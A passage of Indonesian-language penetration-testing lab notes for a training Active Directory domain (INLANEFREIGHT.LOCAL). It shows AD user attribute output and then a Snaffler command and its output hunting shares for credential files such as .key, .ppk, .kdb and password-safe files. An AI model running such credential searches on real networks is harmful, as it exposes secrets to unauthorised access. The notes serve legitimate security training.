pwdlastset                     : 2/28/2022 12:03:45 PM
lastlogoff                     : 12/31/1600 4:00:00 PM
badPasswordTime                : 4/5/2022 7:09:07 AM
name                           : forend
distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
whencreated                    : 2/28/2022 8:03:45 PM
whenchanged                    : 4/9/2022 8:33:21 PM
samaccountname                 : forend
memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
cn                             : {forend}
objectclass                    : {top, person, organizationalPerson, user}
badpwdcount                    : 0
countrycode                    : 0
usnchanged                     : 3259288
logoncount                     : 26618
primarygroupid                 : 513
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
usncreated                     : 3054181
instancetype                   : 4
codepage                       : 0
```

## Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) adalah alat yang dapat membantu kita memperoleh kredensial atau data sensitif lainnya di lingkungan Active Directory



```powershell
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|301B|3/31/2022 12:09:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keychain$|295B|3/31/2022 12:08:42 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keypair$|278B|3/31/2022 12:09:09 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf

```












